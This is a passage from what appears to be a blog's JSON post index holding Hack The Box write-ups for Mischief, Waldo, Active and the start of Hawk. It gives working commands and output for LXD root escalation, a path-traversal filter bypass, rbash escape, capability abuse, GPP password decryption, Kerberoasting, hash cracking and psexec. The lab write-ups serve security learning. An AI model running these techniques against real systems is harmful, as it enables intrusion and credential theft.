lokiisthebestnorsegodroot@violentunicorn:~/hackthebox/Machines/Mischief# ssh loki@10.10.10.92loki@10.10.10.92's password: Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)[...]loki@Mischief:~$ cat user.txtbf5807&lt;redacted&gt;Privesc (unintended method)Our low privilege user is part of the lxd group:loki@Mischief:~$ iduid=1000(loki) gid=1004(loki) groups=1004(loki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),1000(lpadmin),1001(sambashare),1002(debian-tor),1003(libvirtd)So that means we can configure and manage LXC containers on the system.First, we’ll initialize LXD on the box and create a storage pool:loki@Mischief:~$ lxd initWould you like to use LXD clustering? (yes/no) [default=no]: Do you want to configure a new storage pool? (yes/no) [default=yes]: Name of the new storage pool [default=default]: Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: Create a new BTRFS pool? (yes/no) [default=yes]: Would you like to use an existing block device? (yes/no) [default=no]: Size in GB of the new loop device (1GB minimum) [default=15GB]: 8Would you like to connect to a MAAS server? (yes/no) [default=no]: Would you like to create a new network bridge? (yes/no) [default=yes]: noWould you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: Would you like LXD to be available over the network? (yes/no) [default=no]: Would you like stale cached images to be updated automatically? (yes/no) [default=yes] Would you like a YAML \"lxd init\" preseed to be printed? (yes/no) [default=no]:Next, we’ll upload a ubuntu container image that we’ve created on another machine (see: https://dominicbreuker.com/post/htb_calamity/)root@violentunicorn:~/mischief# scp ubuntu.tar.gz loki@10.10.10.92:loki@10.10.10.92's password: ubuntu.tar.gz           Then import it, create a new container out of it, configure it as privileged and mount the local filesystem into it:loki@Mischief:~$ lxc image import ubuntu.tar.gz  --alias yoloImage imported with fingerprint: 65d3db52d47d12928e8392004207269d1d8d542024b64e1b2c638a7e1c19e42dloki@Mischief:~$ lxc init yolo yolo -c security.privileged=trueCreating yoloThe container you are starting doesn't have any network attached to it.  To create a new network, use: lxc network create  To attach a network to a container, use: lxc network attachloki@Mischief:~$ lxc config device add yolo mydevice disk source=/ path=/mnt/root recursive=trueDevice mydevice added to yoloNext we start the container and execute a bash shell:loki@Mischief:~$ lxc config device add yolo mydevice disk source=/ path=/mnt/root recursive=trueDevice mydevice added to yololoki@Mischief:~$ lxc start yololoki@Mischief:~$ lxc exec yolo /bin/bashroot@yolo:~# cd /mnt/root/rootroot@yolo:/mnt/root/root# lsroot.txtroot@yolo:/mnt/root/root# cat root.txtThe flag is not here, get a shell to find it!Looks like the flag is hidden somewhere else…Let’s find it:root@yolo:/mnt/root/root# find /mnt/root -name root.txt 2&gt;/dev/null/mnt/root/usr/lib/gcc/x86_64-linux-gnu/7/root.txt/mnt/root/root/root.txtThere’s another root.txt, let’s see…root@yolo:/mnt/root/root# cat /mnt/root/usr/lib/gcc/x86_64-linux-gnu/7/root.txtae155f&lt;redacted&gt;Game over!"
  },
  
  {
    "title": "Waldo - Hack The Box",
    "url": "/posts/htb-writeup-waldo/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, linux, capabilities, php",
    "date": "2018-12-15 00:00:00 +0800",
    





    
    "snippet": "Linux / 10.10.10.87This blog post is a writeup of the Waldo machine from Hack the Box.Summary  The webserver has a vulnerable function that can be used to browse directories and read files  We can ...",
    "content": "Linux / 10.10.10.87This blog post is a writeup of the Waldo machine from Hack the Box.Summary  The webserver has a vulnerable function that can be used to browse directories and read files  We can read the SSH private key from the nobody user home directory and log in as nobody  We’re within a container but we can log in with SSH as user monitor to the host (127.0.0.1)  There’s a logMonitor application running with elevated capabilities (it can read log files even if not running as root)  This is a hint that we should be looking at capabilities of files (cap_dac_read_search+ei)  We look at the entire filesystem for files with special cap’s and we find that the tac application has that capabily and we can read /root/root.txtDetailed stepsNmapThere’s only a webserver and an SSH service running on this boxroot@darkisland:~# nmap -sC -sV -p- 10.10.10.87Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-04 21:08 EDTNmap scan report for waldo.htb (10.10.10.87)Host is up (0.018s latency).Not shown: 65532 closed portsPORT     STATE    SERVICE        VERSION22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)| ssh-hostkey: |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)80/tcp   open     http           nginx 1.12.2|_http-server-header: nginx/1.12.2| http-title: List Manager|_Requested resource was /list.html|_http-trane-info: Problem with XML parsing of /evox/about8888/tcp filtered sun-answerbookService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.87 secondsWeb enumerationThe webpage is a simple application that displays and manages “lists”, and is using Javascript/Ajax.In the javascript source code (list.js), the readFile function can be abused to read source code of other PHP files in the directory:function readFile(file){   var xhttp = new XMLHttpRequest();  xhttp.open(\"POST\",\"fileRead.php\",false);  xhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");  xhttp.send('file=' + file);  if (xhttp.readyState === 4 &amp;&amp; xhttp.status === 200) {    return xhttp.responseText;  }else{  }}The various files we read are:  fileRead.php  fileWrite.php  fileDelete.php  dirRead.phpThe first thing I tried was to use fileWrite to write an arbitrary PHP file in the .list directory but the filename is derived from the listnum parameter which is checked to make sure it’s numeric (PHP’s is_numeric() function). So we can’t write files with the appropriate extension and execute code.Next, I looked at the dirRead.php file to try to enumerate the file system. The function uses a str_array filter to replace characters that could be used for path traversal: str_replace(array(\"../\", \"..\\\"), \"\", $_POST['path'])So something like ../../../../../ will get replaced with an empty string which is going to default to the current directory.We can verify with using the interactive PHP interpreter:root@darkisland:~# php -aInteractive mode enabledphp &gt; php &gt; echo str_replace( array(\"../\", \"..\\\\\"), \"\", array(\"../../../../\"))[0];php &gt;php &gt; echo str_replace( array(\"../\", \"..\\\\\"), \"\", array(\"this_is_not_blacklisted\"))[0];this_is_not_blacklistedWe can bypass the filter by using the following sequence: ....//....//....//....//php &gt; echo str_replace( array(\"../\", \"..\\\\\"), \"\", array(\"....//....//....//....//\"))[0];../../../../Running it on the target system, we are able to navigate to the user directory:The .monitor file looks interesting, we’ll use the fileRead.php function to read it:Initial shell accessUsing the SSH private key we obtained, we can log in as user nobody:root@darkisland:~/hackthebox/Machines/Waldo# ssh -i waldo.key nobody@10.10.10.87Welcome to Alpine!The Alpine Wiki contains a large amount of how-to guides and generalinformation about administrating Alpine systems.See &lt;http://wiki.alpinelinux.org&gt;.waldo:~$ lsuser.txtwaldo:~$ cat user.txt32768b&lt;redacted&gt;Pivoting to the host OS and privescThere isn’t much else we can do as user nobody since we are in a container.We can however pivot to the host OS by re-using the same key and logging in as user monitor:waldo:~/.ssh$ ssh -i .monitor monitor@127.0.0.1The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:YHb7KyiwRxyN62du1P80KmeA9Ap50jgU6JlRaXThs/M.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64           &amp;.                                                                            @@@,@@/ %                                                                   #*/%@@@@/.&amp;@@,                                                             @@@#@@#&amp;@#&amp;#&amp;@@@,*%/                                                           /@@@&amp;###########@@&amp;*(*                                                       (@################%@@@@@.     /**                                              @@@@&amp;#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/                                %@@@@%##########&amp;@@@....                 .#%#@@@@@@@#                          @@&amp;%#########@@@@/                        */@@@%(((@@@%                           @@@#%@@%@@@,                       *&amp;@@@&amp;%(((#((((@@(                           /(@@@@@@@                     *&amp;@@@@%((((((((((((#@@(                            %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&amp;#,                      %@*(@#%@.,       /@@@@&amp;(((((((((((((((&amp;@@@@@@&amp;#######%%@@@@#    &amp;            *@@@@@#        .&amp;@@@#(((#(#((((((((#%@@@@@%###&amp;@@@@@@@@@&amp;%##&amp;@@@@@@/          /@@          #@@@&amp;#(((((((((((#((@@@@@%%%%@@@@%#########%&amp;@@@@@@@@&amp;           *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&amp;@@@@@@@&amp;        %@/ .&amp;%@@%#(((((((((((((((#@@@@@@@&amp;#####%@@@%#############%@@@&amp;%##&amp;@@/         @@@@@@%(((((((((((##(((@@@@&amp;%####%@@@%#####&amp;@@@@@@@@@@@@@@@&amp;##&amp;@@@@@@@@@/     @@@&amp;(((#((((((((((((#@@@@@&amp;@@@@######@@@###################&amp;@@@&amp;#####%@@*      @@#(((((((((((((#@@@@%&amp;@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@     *@@%((((((((#@@@@@@@%#&amp;@@,,.,,.&amp;@@@#####################%@@@@@@%######&amp;@@.       @@@#(#&amp;@@@@@&amp;##&amp;@@@&amp;#@@/,,,,,,,,@@@&amp;######&amp;@@@@@@@@&amp;&amp;%######%@@@@@@@@@@@        @@@@@@&amp;%&amp;@@@%#&amp;@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&amp;@@%&amp;@@@@@@&amp;%#####%@@@@.          .@@@###&amp;@@@%%@(,,,%@&amp;,.,,,,,,,,,,,,,.*&amp;@@@@&amp;(,*@&amp;#@%%@@@@@@@@@@@@*               @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&amp;@@@@(&amp;@&amp;@&amp;@@@@(                       .@@&amp;##@@,,/@@@@&amp;(.  .&amp;@@@&amp;,,,.&amp;@@/         #@@%@@@@@&amp;@@@/                     *@@@@@&amp;@@.*@@@          %@@@*,&amp;@@            *@@@@@&amp;.#/,@/                    *@@&amp;*#@@@@@@@&amp;     #@(    .@@@@@@&amp;    ,@@@,    @@@@@(,@/@@                     *@@/@#.#@@@@@/    %@@@,   .@@&amp;%@@@     &amp;@&amp;     @@*@@*(@@#                       (@@/@,,@@&amp;@@@            &amp;@@,,(@@&amp;          .@@%/@@,@@                           /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#                             %@@.%@&amp;,(@@@@,  /&amp;@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,                              ,@@,&amp;@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&amp;@                                &amp;@,*@@.,,,,,..,,,,&amp;@@%/**/@@*,,,,,&amp;(.,,,.@@,,@@                                /@%,&amp;@/,,,,/@%,,,,,*&amp;@@@@@#.,,,,,.@@@(,,(@@@@@(                                 @@*,@@,,,#@@@&amp;*..,,,,,,,,,,,,/@@@@,*(,,&amp;@/#*                                   *@@@@@(,,@*,%@@@@@@@&amp;&amp;#%@@@@@@@/,,,,,,,@@                                           @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&amp;@,                                            @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                                             &amp;@&amp;,,,,,,,,,,,,,,,,,,,,,,,,,,,,&amp;@#                                              %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                                               ,@@,,,,,,,,@@@&amp;&amp;&amp;%&amp;@,,,,,..,,@@,                                                *@@,,,,,,,.,****,..,,,,,,,,&amp;@@                                                  (@(,,,.,,,,,,,,,,,,,,.,,,/@@                                                   .@@,,,,,,,,,,,,,...,,,,,,@@                                                     ,@@@,,,,,,,,,,,,,,,,.(@@@                                                        %@@@@&amp;(,,,,*(#&amp;@@@@@@,                                                               Here's Waldo, where's root?Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1-rbash: alias: command not foundIt seems we are in a restricted bash shell since we can’t run arbitrary comands:monitor@waldo:~$ cd /-rbash: cd: restrictedmonitor@waldo:~$ lsapp-dev  binmonitor@waldo:~$ cd bin-rbash: cd: restrictedmonitor@waldo:~$ lsapp-dev  binmonitor@waldo:~$ ls binls  most  red  rnanomonitor@waldo:~$ We can easily bypass rbash by skipping the profile of the user with the -t bash --noprofile arguments:waldo:~/.ssh$ ssh -i .monitor monitor@127.0.0.1 -t bash --noprofilemonitor@waldo:~$ However our PATH is no longer set so we’ll need to set it manually:monitor@waldo:~$ echo $PATH/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATHmonitor@waldo:~$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1Now that we have access with a regular shell, we can start looking around.In the app-dev directory of the monitor home directory, there is a log monitoring application along with the source code. The application simply reads hardcoded log files based on the CLI argument passed to it:[...]case 'a' :          strncpy(filename, \"/var/log/auth.log\", sizeof(filename));          printFile(filename);          break;        case 'A' :          strncpy(filename, \"/var/log/alternatives.log\", sizeof(filename));          printFile(filename);          break;        case 'b' :          strncpy(filename, \"/var/log/btmp\",sizeof(filename));          printFile(filename);          break;        case 'd' :          strncpy(filename, \"/var/log/daemon.log\",sizeof(filename));          printFile(filename);          break;        case 'D' :          strncpy(filename, \"/var/log/dpkg.log\",sizeof(filename));          printFile(filename);          break;[...]We can modify the source code and re-compile it but it’s not running as root so any modifications we make like adding a /bin/bash shell argument option will only result in a shell running as user monitor. At first, it seemed like this was a box with a cronjob running every few minutes that would compile and run the program but this isn’t the case.Next, we looked at the v0.1 directory that contains yet another copy of the software. The interesting part here is that the application is able to read log files even though it doesn’t have the SUID bit set:monitor@waldo:~/app-dev$ ./logMonitor -aCannot open filemonitor@waldo:~/app-dev/v0.1$ ./logMonitor-0.1 -aAug  4 21:17:01 waldo CRON[938]: pam_unix(cron:session): session opened for user root by (uid=0)Aug  4 21:17:01 waldo CRON[938]: pam_unix(cron:session): session closed for user rootAug  4 22:00:37 waldo sshd[980]: Accepted publickey for monitor from 127.0.0.1 port 57202 ssh2: RSA SHA256:Kl+zDjbDx4fQ7xVvGg6V3RhjezqB1gfe2kWqm1AMD0c[...]monitor@waldo:~/app-dev$ ls -l logMonitor-rwxrwx--- 1 app-dev monitor 13704 Jul 24 08:10 logMonitormonitor@waldo:~/app-dev$ ls -l v0.1/logMonitor-0.1 -r-xr-x--- 1 app-dev monitor 13706 May  3 16:50 v0.1/logMonitor-0.1So, both files are owned by the same user and do not have the SUID bit set… Why is the v0.1 file able to read log files then?Let’s look at file capabilities:monitor@waldo:~$ getcap -r *app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+eiThe cap_dac_read_search capability is used to Bypass file read permission checks and directory read and execute permission checks. So basically, if a file has this permission it can read anything.We can’t use this file to read anything other than log files but maybe there are other similar files on the host:monitor@waldo:~$ getcap -r /* 2&gt;/dev/null/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei/usr/bin/tac = cap_dac_read_search+eiWhat is this tac binary?monitor@waldo:~$ /usr/bin/tac --helpUsage: /usr/bin/tac [OPTION]... [FILE]...Write each FILE to standard output, last line first.Ok, we can use this to read files, let’s grab root.txt and finish this box:monitor@waldo:~$ tac /root/root.txt8fb67c&lt;redacted&gt;"
  },
  
  {
    "title": "Active - Hack The Box",
    "url": "/posts/htb-writeup-active/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, kerberos, ad",
    "date": "2018-12-08 00:00:00 +0800",
    





    
    "snippet": "Windows / 10.10.10.100This blog post is a writeup for Active from Hack the Box.Summary  There’s a GPP file with user credentials on the replication share of the DC which we can can crack with gpp-d...",
    "content": "Windows / 10.10.10.100This blog post is a writeup for Active from Hack the Box.Summary  There’s a GPP file with user credentials on the replication share of the DC which we can can crack with gpp-decrypt  We then grab an encrypted ticket using the Kerberoasting technique and recover the Administrator passwordTools/Blogs  gpp-decrypt  Impacket  PyKerberoastDetailed stepsNmapThis Windows Server is running kerberos on port 88 so it’s probably an Active Directory serverroot@violentunicorn:~/hackthebox# nmap -F 10.10.10.100Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 20:19 EDTNmap scan report for active.htb (10.10.10.100)Host is up (0.16s latency).Not shown: 89 closed portsPORT      STATE SERVICE53/tcp    open  domain88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49157/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 1.83 secondsEnumerating the SMB replication sahreAll sorts of interesting ports are open on the server. First, let’s check which shares are publicly accessible:root@violentunicorn:~# enum4linux 10.10.10.100 ========================================= |    Share Enumeration on 10.10.10.100    | ========================================= WARNING: The \"syslog\" option is deprecated  Sharename       Type      Comment  ---------       ----      -------  ADMIN$          Disk      Remote Admin  C$              Disk      Default share  IPC$            IPC       Remote IPC  NETLOGON        Disk      Logon server share   Replication     Disk        SYSVOL          Disk      Logon server share   Users           Disk      Reconnecting with SMB1 for workgroup listing.Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Failed to connect with SMB1 -- no workgroup available[+] Attempting to map shares on 10.10.10.100//10.10.10.100/ADMIN$ Mapping: DENIED, Listing: N/A//10.10.10.100/C$ Mapping: DENIED, Listing: N/A//10.10.10.100/IPC$ Mapping: OK Listing: DENIED//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A//10.10.10.100/Replication  Mapping: OK, Listing: OK//10.10.10.100/SYSVOL Mapping: DENIED, Listing: N/A//10.10.10.100/Users  Mapping: DENIED, Listing: N/ASo IPC$ and Replication are open, let’s check Replication…root@violentunicorn:~# smbclient -N -U \"\" //10.10.10.100/ReplicationWARNING: The \"syslog\" option is deprecatedTry \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  active.htb                          D        0  Sat Jul 21 06:37:44 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\&gt; cd active.htbsmb: \\active.htb\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018  Policies                            D        0  Sat Jul 21 06:37:44 2018  scripts                             D        0  Wed Jul 18 14:48:57 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\&gt; cd Policiessmb: \\active.htb\\Policies\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\&gt; cd {31B2F340-016D-11D2-945F-00C04FB984F9}smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018  Group Policy                        D        0  Sat Jul 21 06:37:44 2018  MACHINE                             D        0  Sat Jul 21 06:37:44 2018  USER                                D        0  Wed Jul 18 14:49:12 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\&gt; cd machinelsmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  Microsoft                           D        0  Sat Jul 21 06:37:44 2018  Preferences                         D        0  Sat Jul 21 06:37:44 2018  Registry.pol                        A     2788  Wed Jul 18 14:53:45 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\&gt; cd preferenceslsmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  Groups                              D        0  Sat Jul 21 06:37:44 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\&gt; cd groupslssmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\groups\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\groups\\&gt; get groups.xmlgetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\groups\\groups.xml of size 533 as groups.xml (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\groups\\&gt; exitSo we just found Group Policy Preferences in a file, with encrypted credentials.root@violentunicorn:~# cat groups.xml&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;&lt;/Groups&gt;Luckily, the encryption key for this has been leaked by Microsoft a few years ago and we can decrypt it using gpp-decrypt:root@violentunicorn:~# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecatedGPPstillStandingStrong2k18So we now have the following user account’s credentials:  Username: SVC_TGS  Password: GPPstillStandingStrong2k18We can log in with that account and recover the user flag:root@violentunicorn:~# smbclient -U svc_tgs //10.10.10.100/UsersWARNING: The \"syslog\" option is deprecatedEnter WORKGROUP\\svc_tgs's password: Try \"help\" to get a list of possible commands.smb: \\&gt; cd svc_tgssmb: \\svc_tgs\\&gt; cd desktopsmb: \\svc_tgs\\desktop\\&gt; get user.txtgetting file \\svc_tgs\\desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)smb: \\svc_tgs\\desktop\\&gt; exitroot@violentunicorn:~# cat user.txt86d67d&lt;redacted&gt;KerberoastingNext, we’ll look for Service Principal Names and encrypted service tickets that we can crack to recover other credentials.We’ll use PyKerberoast for this since we are on Kali and not Windows.root@violentunicorn:~/PyKerberoast# python kerberoastv2.py -a 10.10.10.100 -b cn=users,dc=active,dc=htb -d active -u svc_tgs -p GPPstillStandingStrong2k18[+]Starting...$krb5tgs$18$*krbtgt$ACTIVE.HTB$spn*$cabf481b2b4dbd9567c5bee15e9d2ec9$04f2407e7fadab18a8f8ebda0e66af92e91c305098340e701383738a9cd317b15024815917af864e679ae02f8b610e18842308a54a9f0a2095ab688a972c5e03903f5d2cbf2d72cc5894ff6fa45413b95a1c94ee8fd1c9e8990c95748ba93a83bc078b3653b678a60fa0eb42cdaccdb3b4e5d5d97925676059c5b3495ce37a1fc964cf7cdeba452811d52a103633ffc5033709c3a2ac0f4f0a6aa06700b2817956c37c2f20e4ef5684b41d3f87e3f7fd80ed51088ef648f874b5fe113b5da0ebe5c7e77d63945ca190bb1dab377f75f6da85cbc261635fefdd42e621ac711c26c87d99b761941330e010fec48fd06219cd1aa7a8e91c9b0f36728ca30e68128db767e2e54c57d185b0700c03e7eb66fa62903971cdca7d481e4d4db09cc22a943ddb8ead77b4a2f2fc5cac6f34a6af8e796b5dd9f2e4310af99271a64af70c2c3aacfb8820b805d8efb3899e7a4d22c5adbf33f970e8fa7ce8ea79ad83a265aa3a4af2464d7cb296333199251a27f2fc189935f87c116e9143accd254ba4fb5d2a6f80af535076afbf8a89bea83941f703d312605d7fadc5d6583c9a86463ddc69165bdb0aabeab30edee51032dc160e3e349eb2f0c465f891015b7a127c9ef47949fdba2c1e2392d0cee6d03f54e5d36e63be681d1d2ad084c0f892b447352039488f21c184d7d0d5d68c0f15197579217ac48d3f1770710e5e0af95140d7394aae11371fd098b9591a1f6de4d4448db180a612917a8b0309e1b1a443d52d40f974e1036406c0aacf46b3be2286408cacd0c55a0e3146e7226cf6ab9c5d1b2af6939eac9c750c652f02925ab0549c3fd56f3655ceb37ec368dc24c034e6030a1b25dac3691e80098547a08b638560f2ffd37dcde83df28152fcbc9a93d9ef11a2e84f5b8efd3c8489983dceb394d22969d9c86b06af4b6633c55d86f61d1feac5dd4c541fa4e405b2b2e5fc41622833a45026dfef1e7a04b0577f2b5229b68e12af85af2cc074c3aae267c1c942cea9bcb21640bd2d0fe75996f93623e5cbaab186b7cedef4c1db1240b5c8cbb486f50bc7fafed38cd40a7605a6511d0cd393c8aa1c0387c7df9bd8c9a3f3af3eb2fe6341a88c6fac220f53725cd574f92c75e1f1a47be01a1a6bbf865fef2a681b981f2a2cf126797b7fcab95315c430f46e6140266d693e41dfb964c5f80e88ebb6c04cbe6299ef0f5cab31e8e75278474633d33251029cf0cdd2c40fe4678581ecdd193b7eac40[+]Done!Sweet, we got a ticket for the Administrator user! Let’s brute force this bitch now.Password crackingBecause this is HTB, the password is in the rockyou.txt file:root@violentunicorn:~/JohnTheRipper/run# ~/JohnTheRipper/run/john -w=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusTicketmaster1968 (?)1g 0:00:00:39 DONE (2018-07-28 20:50) 0.02515g/s 265093p/s 265093c/s 265093C/s Tiffani1432..Tiago_18Use the \"--show\" option to display all of the cracked passwords reliablySession completedOk, nice we now have the Administrator password: Ticketmaster1968Remote access using psexecWe could just grab the flag using smbclient but we’ll try to get a proper shell using psexec:root@violentunicorn:~# psexec.py administrator:Ticketmaster1968@10.10.10.100Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies[*] Requesting shares on 10.10.10.100.....[*] Found writable share ADMIN$[*] Uploading file xZMcKohO.exe[*] Opening SVCManager on 10.10.10.100.....[*] Creating service vTmo on 10.10.10.100.....[*] Starting service vTmo.....[!] Press help for extra shell commandsMicrosoft Windows [Version 6.1.7600]Copyright (c) 2009 Microsoft Corporation.  All rights reserved.C:\\Windows\\system32&gt;whoamint authority\\systemC:\\Windows\\system32&gt;cd \\users\\administrator\\desktopC:\\Users\\Administrator\\Desktop&gt;type root.txtb5fc76&lt;redacted&gt;"
  },
  
  {
    "title": "Hawk - Hack The Box",
    "url": "/posts/htb-writeup-hawk/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, drupal",
    "date": "2018-12-01 00:00:00 +0800",
    





    
    "snippet": "Linux / 10.10.10.102This blog post is a quick writeup of Hawk from Hack the Box.Summary  The server is running an FTP server, a Drupal website and an H2 database (which is not accessible remotely) ...",
    "content": "Linux / 10.10.10.102This blog post is a quick writeup of Hawk from Hack the Box.Summary  The server is running an FTP server, a Drupal website and an H2 database (which is not accessible remotely)  There is an OpenSSL encrypted file on the publicly accessible FTP server  We can bruteforce the key using a bash script and the openssl command  The file contains the password for the Drupal admin account  Once we are logged in to Drupal, we can create a PHP file that creates a reverse shell  The shell gets us www-data and we can find the connection password in the Drupal configuration file  We can log in as user daniel with the password we found  The normal /bin/bash shell for user daniel has been replaced by python, which we can escape using pty.spawn  Looking at the running processes, we find that the H2 database is running as root  We can access the web interface by creating an SSH reverse tunnel back to our Kali machine  The sa username is using the default empty password but we can log in by changing the URL to anything other than the default string  Once logged in, we can execute commands as root using H2 SQL commandsTools/Blogs  https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.htmlDetailed stepsNmapServices running:  FTP  SSH  Apache  5435 (?)  H2 database (Web &amp; TCP interface)root@violentunicorn:~/hackthebox/Machines/Hawk# nmap -p- 10.10.10.102Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-14 19:26 EDTNmap scan report for hawk.htb (10.10.10.102)Host is up (0.017s latency).Not shown: 65529 closed portsPORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh80/tcp   open  http5435/tcp open  sceanics8082/tcp open  blackice-alerts9092/tcp open  XmlIpcRegSvcNmap done: 1 IP address (1 host up) scanned in 10.50 secondsServices enumerationDrupal is running on Port 80.H2’s database is not accessible on the HTTP port:H2 ConsoleSorry, remote connections ('webAllowOthers') are disabled on this server. H2’s database is not accessible on the TCP port:root@violentunicorn:~/Hawk# telnet 10.10.10.102 9092Trying 